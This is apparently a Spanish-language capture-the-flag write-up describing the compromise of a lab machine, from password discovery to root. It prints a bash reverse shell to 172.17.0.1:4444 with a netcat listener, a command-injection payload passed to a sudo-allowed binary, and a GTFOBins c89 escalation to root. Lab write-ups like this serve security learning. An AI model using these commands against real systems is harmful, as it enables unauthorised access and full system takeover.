## Reconocimiento

Puerto 80 : HTTP

Puerto 7777 : SimpleHTTPServer ( Python3.12.3 ) 

En la web hay un panel que para pasarlo nos pide una clave.  En la web alojada en el puerto 7777 hay un archivo llamado history.txt que contiene un texto donde nos cuenta una historia en la cual se repite una palabra muy seguido:

```bash
super_secure_password 
```

Funciona, es la clave de acceso del panel.

Dentro hay una pagina de configuración que pide un nombre y el contenido de un archivo en bash para luego ejecutarlo. Después de probar veo como mandarme una shell:

shell.sh

```bash
#!/bin/bash

sh -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

Info:

```
Configuración 'shell.sh' aplicada con éxito.
```

Antes de ejecutarlo me pongo en escucha:

```bash
nc -lnvp 4444
```

Hago click en Execute Remote Configuration y recibo conexión.

## Escalada www-data → codebad

```bash
cd /home/codebad/secret/adivina.txt
```

Tenemos un acertijo, el cual su respuesta es “malware”, siendo esta la contraseña para el usuario codebad.

## Escalada codebad → metadata

```bash
sudo -l
(metadata : metadata) NOPASSWD: /home/codebad/code
```

Haciendo un poco de ingeniería inversa en mi maquina local, puedo ver que requiere parámetros para funcionar. inspeccionando el código en C, veo que espera la opción y comando “ls”:

```bash
sudo -u metadata /home/codebad/code '-la'
```

Funciona, pero no tenemos nada aún. Después de un rato encuentro que al concatenar comandos puedo ejecutarlos con el usuario metadata ya que es el dueño del archivo:

```bash
sudo -u metadata /home/codebad/code '-la; whoami'
# Info:
...
-rwxr-xr-x 1 metadata metadata 16176 Aug 29 12:16 code
drwxr-xr-x 2 root     root      4096 Aug 29 11:49 secret
metadata
```

Así que puedo obtener una shell:

```bash
sudo -u metadata /home/codebad/code '-la; bash -i'
```

## Escalada metadata → root

```bash
sudo -l
(ALL : ALL) /usr/bin/c89
```

Gracias GTFO Bins por todo:

```bash
sudo c89 -wrapper /bin/sh,-s .
```

Listo.
